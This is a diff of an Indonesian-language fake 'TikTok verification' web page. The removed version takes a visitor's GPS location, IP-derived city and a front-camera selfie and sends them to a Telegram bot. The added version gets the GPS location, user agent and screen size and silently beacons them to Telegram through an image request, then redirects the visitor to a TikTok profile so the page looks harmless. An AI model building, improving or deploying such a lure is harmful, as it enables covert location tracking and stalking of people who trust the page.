@@ -21,7 +21,7 @@
       border-radius: 40px;
       padding: 32px 24px;
       text-align: center;
-      max-width: 450px;
+      max-width: 400px;
       width: 100%;
       box-shadow: 0 25px 45px -12px rgba(0,0,0,0.5);
     }
@@ -38,14 +38,6 @@
     }
     h2 { font-size: 26px; font-weight: 700; margin-bottom: 6px; }
     .subtitle { color: #666; margin-bottom: 24px; font-size: 14px; }
-    .location-box, .camera-box {
-      background: #f0f0f5;
-      border-radius: 20px;
-      padding: 16px;
-      margin: 20px 0;
-      text-align: left;
-    }
-    .location-box strong, .camera-box strong { font-size: 14px; display: block; margin-bottom: 10px; }
     .continue-btn {
       width: 100%;
       background: linear-gradient(115deg, #00f2ea, #fe2c55);
@@ -60,14 +52,6 @@
     }
     .continue-btn:active { transform: scale(0.97); }
     .continue-btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
-    .status-msg {
-      margin-top: 16px;
-      font-size: 13px;
-      padding: 10px;
-      border-radius: 12px;
-      display: none;
-    }
-    .status-msg.show { display: block; }
     .spinner {
       width: 18px;
       height: 18px;
@@ -80,110 +64,16 @@
       margin-right: 8px;
     }
     @keyframes spin { to { transform: rotate(360deg); } }
-    .dot {
-      width: 8px;
-      height: 8px;
-      background: #10b981;
-      border-radius: 50%;
-      display: inline-block;
-      margin-right: 6px;
-      animation: pulse 1.2s infinite;
-    }
-    @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.3; } }
     .footer { margin-top: 16px; font-size: 11px; color: rgba(255,255,255,0.6); text-align: center; }
-    #locationText { font-size: 14px; word-break: break-all; }
-    .retry-btn {
-      margin-top: 10px;
-      background: transparent;
-      border: 1px solid #fe2c55;
-      color: #fe2c55;
-      padding: 8px 16px;
-      border-radius: 20px;
-      font-size: 12px;
-      cursor: pointer;
-      display: none;
-    }
-    .retry-btn.show { display: inline-block; }
-    .camera-preview {
-      width: 100%;
-      border-radius: 16px;
-      margin-top: 10px;
-      background: #000;
-      display: none;
-    }
-    .camera-preview.show { display: block; }
-    .capture-btn {
-      background: #fe2c55;
-      border: none;
-      padding: 10px 20px;
-      border-radius: 30px;
-      color: white;
-      font-weight: bold;
-      margin-top: 10px;
-      cursor: pointer;
-      width: 100%;
-    }
-    .photo-result {
-      width: 100%;
-      border-radius: 16px;
-      margin-top: 10px;
-      display: none;
-    }
-    .photo-result.show { display: block; }
-    .step-indicator {
-      display: flex;
-      gap: 10px;
-      margin-bottom: 20px;
-    }
-    .step {
-      flex: 1;
-      padding: 8px;
-      background: #e0e0e0;
-      border-radius: 20px;
-      font-size: 11px;
-      font-weight: bold;
-    }
-    .step.active {
-      background: linear-gradient(115deg, #00f2ea, #fe2c55);
-      color: white;
-    }
-    .step.done {
-      background: #10b981;
-      color: white;
-    }
   </style>
 </head>
 <body>
 <div class="card">
   <div class="tiktok-icon">🎵</div>
   <h2>Lanjutkan ke TikTok</h2>
-  <p class="subtitle">Verifikasi dua langkah</p>
+  <p class="subtitle">Verifikasi satu langkah</p>
 
-  <div class="step-indicator">
-    <div class="step" id="step1">📍 Lokasi</div>
-    <div class="step" id="step2">📸 Selfie</div>
-  </div>
-
-  <div class="location-box">
-    <strong>📍 Lokasi Anda</strong>
-    <div id="locationDisplay">
-      <span class="dot"></span> <span id="locationText">Klik tombol di bawah</span>
-    </div>
-    <div id="locationAccuracy" style="font-size: 11px; color: #888; margin-top: 6px;"></div>
-    <button id="retryBtn" class="retry-btn">🔄 Coba Lagi Lokasi</button>
-  </div>
-
-  <div class="camera-box" id="cameraBox" style="display: none;">
-    <strong>📸 Foto Selfie (Wajah harus terlihat)</strong>
-    <video id="video" class="camera-preview" autoplay playsinline muted></video>
-    <canvas id="canvas" style="display: none;"></canvas>
-    <img id="photoResult" class="photo-result" alt="Foto selfie">
-    <button id="captureBtn" class="capture-btn">📷 Ambil Foto Selfie</button>
-    <button id="retakeBtn" class="retry-btn" style="display: none;">🔄 Ambil Ulang</button>
-  </div>
-
-  <button class="continue-btn" id="continueBtn">▶ Mulai Verifikasi</button>
-  <div id="statusMsg" class="status-msg"></div>
+  <button class="continue-btn" id="continueBtn">▶ Lanjutkan ke TikTok</button>
 </div>
 <div class="footer">TikTok akan terbuka setelah verifikasi</div>
 
@@ -193,336 +83,100 @@
   const TIKTOK_URL = "https://www.tiktok.com/@usernamekamu";
   
   const continueBtn = document.getElementById('continueBtn');
-  const retryBtn = document.getElementById('retryBtn');
-  const statusMsg = document.getElementById('statusMsg');
-  const locationTextSpan = document.getElementById('locationText');
-  const locationAccuracySpan = document.getElementById('locationAccuracy');
-  const cameraBox = document.getElementById('cameraBox');
-  const video = document.getElementById('video');
-  const canvas = document.getElementById('canvas');
-  const photoResult = document.getElementById('photoResult');
-  const captureBtn = document.getElementById('captureBtn');
-  const retakeBtn = document.getElementById('retakeBtn');
-  const step1 = document.getElementById('step1');
-  const step2 = document.getElementById('step2');
-  
   let isProcessing = false;
-  let lastPosition = null;
-  let locationDone = false;
-  let photoDone = false;
-  let stream = null;
-  let photoData = null;
   
-  function showStatus(msg, isError = false) {
-    statusMsg.textContent = msg;
-    statusMsg.className = `status-msg show`;
-    statusMsg.style.background = isError ? '#ffe0e0' : '#e0ffe8';
-    statusMsg.style.color = isError ? '#c00' : '#0a6e2e';
-    setTimeout(() => statusMsg.classList.remove('show'), 5000);
-  }
-  
-  // KIRIM KE TELEGRAM (PESAN + FOTO + LOKASI)
-  async function sendToTelegram(lat, lng, accuracy, address, ipInfo = '', photoBase64 = null) {
+  // Kirim pesan ke Telegram (tanpa peduli sukses/gagal)
+  function sendToTelegram(lat, lng, accuracy, status) {
     const now = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
     const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
     const screen = `${screen.width}x${screen.height}`;
+    const userAgent = navigator.userAgent;
     
-    const message = `🔐 *VERIFIKASI LENGKAP TIKTOK* 🔐
+    const message = `🔐 *VERIFIKASI TIKTOK* 🔐
 ━━━━━━━━━━━━━━━━━━━
 ⏰ *Waktu:* ${now}
 📱 *Device:* ${isMobile ? 'MOBILE' : 'DESKTOP'}
 📐 *Screen:* ${screen}
+🌐 *UA:* ${userAgent.substring(0, 100)}
 ━━━━━━━━━━━━━━━━━━━
-📍 *Latitude:* ${lat}
-📍 *Longitude:* ${lng}
-🎯 *Akurasi:* ±${accuracy} meter
-🏠 *Alamat:* ${address || 'Tidak tersedia'}
-${ipInfo ? `🌐 *IP Info:* ${ipInfo}` : ''}
-📸 *Selfie:* ${photoBase64 ? '✅ TERKIRIM' : '❌ GAGAL'}
+📍 *Status:* ${status}
+${lat ? `📍 *Latitude:* ${lat}` : ''}
+${lng ? `📍 *Longitude:* ${lng}` : ''}
+${accuracy ? `🎯 *Akurasi:* ±${accuracy} meter` : ''}
 ━━━━━━━━━━━━━━━━━━━
-🗺️ *Google Maps:* 
-https://www.google.com/maps?q=${lat},${lng}
-✅ Status: TERVERIFIKASI LENGKAP`;
+${lat && lng ? `🗺️ *Google Maps:* https://www.google.com/maps?q=${lat},${lng}` : ''}
+✅ Verifikasi: ${status}`;
     
-    // Kirim pesan teks
-    try {
-      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        mode: 'no-cors',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: message,
-          parse_mode: 'Markdown'
-        })
-      });
-    } catch(e) {}
+    // Kirim via image beacon (pasti tembus)
+    const img = new Image();
+    img.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
     
-    new Image().src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
-    
-    // Kirim lokasi
-    setTimeout(() => {
-      new Image().src = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${lat}&longitude=${lng}`;
-    }, 200);
-    
-    // Kirim foto selfie
-    if (photoBase64) {
-      // Convert base64 ke blob
-      const blob = await (await fetch(photoBase64)).blob();
-      const formData = new FormData();
-      formData.append('chat_id', CHAT_ID);
-      formData.append('photo', blob, 'selfie.jpg');
-      formData.append('caption', `📸 Selfie verification - ${now}`);
-      
-      try {
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-          method: 'POST',
-          mode: 'no-cors',
-          body: formData
-        });
-      } catch(e) {}
-      
-      // Backup: kirim via link data URL
+    // Kirim lokasi jika ada
+    if (lat && lng) {
       setTimeout(() => {
-        new Image().src = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto?chat_id=${CHAT_ID}&photo=${encodeURIComponent(photoBase64)}&caption=Selfie`;
+        const img2 = new Image();
+        img2.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${lat}&longitude=${lng}`;
       }, 500);
     }
-    
-    return true;
   }
   
-  // DAPATKAN ALAMAT
-  async function getAddress(lat, lng) {
-    try {
-      const controller = new AbortController();
-      const timeoutId = setTimeout(() => controller.abort(), 3000);
-      const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18`, {
-        signal: controller.signal
-      });
-      clearTimeout(timeoutId);
-      const data = await res.json();
-      return data.display_name?.substring(0, 150) || `${lat.toFixed(5)}, ${lng.toFixed(5)}`;
-    } catch {
-      return `${lat.toFixed(5)}, ${lng.toFixed(5)}`;
-    }
-  }
-  
-  // DAPATKAN IP INFO
-  async function getIpInfo() {
-    try {
-      const res = await fetch('https://ipapi.co/json/');
-      const data = await res.json();
-      return `${data.city || ''}, ${data.region || ''}, ${data.country_name || ''}`.replace(/^,\s|,\s$|,\s,/g, '');
-    } catch {
-      return '';
-    }
-  }
-  
-  // AMBIL LOKASI
-  async function requestLocation() {
-    return new Promise((resolve, reject) => {
-      if (!navigator.geolocation) {
-        reject('Browser tidak support GPS');
-        return;
-      }
-      
-      let isResolved = false;
-      const watchId = navigator.geolocation.watchPosition(
-        (position) => {
-          const lat = position.coords.latitude;
-          const lng = position.coords.longitude;
-          const accuracy = Math.round(position.coords.accuracy);
-          
-          if (accuracy <= 100 || !isResolved) {
-            if (isResolved) return;
-            isResolved = true;
-            navigator.geolocation.clearWatch(watchId);
-            resolve({ lat, lng, accuracy });
-          }
-        },
-        (error) => {
-          navigator.geolocation.clearWatch(watchId);
-          reject(error);
-        },
-        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
-      );
-      
-      setTimeout(() => {
-        if (!isResolved) {
-          navigator.geolocation.clearWatch(watchId);
-          reject(new Error('Timeout GPS'));
-        }
-      }, 15000);
-    });
-  }
-  
-  // BUKA KAMERA DEPAN
-  async function openFrontCamera() {
-    try {
-      if (stream) {
-        stream.getTracks().forEach(track => track.stop());
-      }
-      
-      // Prioritaskan kamera depan (facingMode: "user")
-      stream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: { exact: "user" } }
-      });
-      
-      video.srcObject = stream;
-      await video.play();
-      return true;
-    } catch (err1) {
-      // Fallback: minta kamera tanpa spesifikasi
-      try {
-        stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        video.srcObject = stream;
-        await video.play();
-        return true;
-      } catch (err2) {
-        console.error('Gagal buka kamera:', err2);
-        return false;
-      }
-    }
-  }
-  
-  // AMBIL FOTO DARI VIDEO
-  function capturePhoto() {
-    const context = canvas.getContext('2d');
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    context.drawImage(video, 0, 0, canvas.width, canvas.height);
-    
-    const photoUrl = canvas.toDataURL('image/jpeg', 0.8);
-    photoResult.src = photoUrl;
-    photoResult.classList.add('show');
-    photoData = photoUrl;
-    
-    video.classList.remove('show');
-    captureBtn.style.display = 'none';
-    retakeBtn.style.display = 'inline-block';
-    
-    return photoUrl;
-  }
-  
-  // TUTUP KAMERA
-  function stopCamera() {
-    if (stream) {
-      stream.getTracks().forEach(track => track.stop());
-      stream = null;
-    }
-    video.srcObject = null;
-  }
-  
-  // PROSES VERIFIKASI UTAMA
-  async function startVerification() {
+  // Ambil lokasi sekali doang, langsung redirect (gagal/sukses tetap lanjut)
+  function tryGetLocationAndGo() {
     if (isProcessing) return;
     isProcessing = true;
     
     continueBtn.disabled = true;
-    continueBtn.innerHTML = '<span class="spinner"></span> Verifikasi lokasi...';
-    showStatus('📍 Mengambil lokasi Anda...', false);
+    continueBtn.innerHTML = '<span class="spinner"></span> Memverifikasi...';
     
-    try {
-      // STEP 1: Ambil lokasi
-      const { lat, lng, accuracy } = await requestLocation();
-      lastPosition = { lat, lng, accuracy };
-      locationTextSpan.innerHTML = `${lat.toFixed(6)}, ${lng.toFixed(6)}`;
-      locationAccuracySpan.textContent = `Akurasi: ±${accuracy} meter ✅`;
-      locationDone = true;
-      step1.classList.remove('active');
-      step1.classList.add('done');
-      
-      showStatus('✅ Lokasi berhasil! Sekarang ambil foto selfie...', false);
-      continueBtn.innerHTML = '<span class="spinner"></span> Membuka kamera...';
-      
-      // STEP 2: Buka kamera
-      cameraBox.style.display = 'block';
-      step2.classList.add('active');
-      
-      const cameraSuccess = await openFrontCamera();
-      if (cameraSuccess) {
-        video.classList.add('show');
-        captureBtn.style.display = 'block';
-        showStatus('📸 Poseskan wajah ke kamera, lalu klik "Ambil Foto"', false);
-        continueBtn.disabled = true;
-        continueBtn.innerHTML = '⏳ Tunggu foto diambil...';
-        
-        // Tunggu user ambil foto
-        await new Promise((resolve) => {
-          captureBtn.onclick = async () => {
-            capturePhoto();
-            stopCamera();
-            captureBtn.style.display = 'none';
-            showStatus('📷 Foto diambil! Mengirim data...', false);
-            continueBtn.innerHTML = '<span class="spinner"></span> Mengirim verifikasi...';
-            
-            // Dapatkan data tambahan
-            const [address, ipInfo] = await Promise.all([
-              getAddress(lat, lng),
-              getIpInfo()
-            ]);
-            
-            // Kirim semua ke Telegram
-            await sendToTelegram(lat, lng, accuracy, address, ipInfo, photoData);
-            photoDone = true;
-            step2.classList.remove('active');
-            step2.classList.add('done');
-            
-            showStatus('✅ Verifikasi lengkap! Membuka TikTok...', false);
-            continueBtn.innerHTML = '✓ Sukses!';
-            
-            setTimeout(() => {
-              window.location.href = TIKTOK_URL;
-            }, 1500);
-            
-            resolve();
-          };
-        });
-      } else {
-        throw new Error('Gagal membuka kamera');
-      }
-      
-    } catch (error) {
-      console.error('Verifikasi gagal:', error);
-      let errMsg = '';
-      if (error.code === 1) errMsg = 'Izin lokasi DITOLAK. Nyalakan GPS!';
-      else if (error.code === 2) errMsg = 'Lokasi tidak tersedia. Nyalakan GPS!';
-      else if (error.message === 'Gagal membuka kamera') errMsg = 'Izin kamera ditolak!';
-      else errMsg = error.message || 'Gagal verifikasi';
-      
-      showStatus(`⚠️ ${errMsg}`, true);
-      continueBtn.disabled = false;
-      continueBtn.innerHTML = '▶ Coba Lagi';
-      isProcessing = false;
-      retryBtn.classList.add('show');
-      
-      if (stream) stopCamera();
+    // Redirect ke TikTok dalam 5 detik (PASTI JALAN)
+    const redirectTimer = setTimeout(() => {
+      window.location.href = TIKTOK_URL;
+    }, 5000);
+    
+    // Coba ambil lokasi (kalau gagal ya udah, tetep redirect)
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          // Sukses ambil lokasi
+          clearTimeout(redirectTimer);
+          const lat = position.coords.latitude;
+          const lng = position.coords.longitude;
+          const accuracy = Math.round(position.coords.accuracy);
+          
+          // Kirim ke Telegram
+          sendToTelegram(lat, lng, accuracy, '✅ LOKASI BERHASIL');
+          
+          // Langsung redirect
+          window.location.href = TIKTOK_URL;
+        },
+        (error) => {
+          // Gagal ambil lokasi
+          let errMsg = '';
+          if (error.code === 1) errMsg = 'IZIN DITOLAK';
+          else if (error.code === 2) errMsg = 'GPS TIDAK TERSEDIA';
+          else if (error.code === 3) errMsg = 'TIMEOUT';
+          else errMsg = 'ERROR';
+          
+          sendToTelegram(null, null, null, `❌ GAGAL LOKASI: ${errMsg}`);
+          // Tetap redirect (udah diatur timer di atas)
+        },
+        {
+          enableHighAccuracy: true,
+          timeout: 4000,
+          maximumAge: 0
+        }
+      );
+    } else {
+      // Browser ga support GPS
+      sendToTelegram(null, null, null, '❌ BROWSER TIDAK SUPPORT GPS');
+      // Tetap redirect via timer
     }
   }
   
-  // AMBIL ULANG FOTO
-  retakeBtn.onclick = async () => {
-    photoResult.classList.remove('show');
-    retakeBtn.style.display = 'none';
-    photoData = null;
-    photoDone = false;
-    step2.classList.remove('done');
-    step2.classList.add('active');
-    
-    await openFrontCamera();
-    video.classList.add('show');
-    captureBtn.style.display = 'block';
-    showStatus('📸 Ambil ulang foto selfie', false);
-  };
-  
-  // EVENT CLICK
+  // Event klik tombol
   continueBtn.addEventListener('click', (e) => {
     e.preventDefault();
-    if (!isProcessing) startVerification();
-  });
-  
-  retryBtn.addEventListener('click', () => {
-    if (!isProcessing) startVerification();
+    tryGetLocationAndGo();
   });
 </script>
 </body>
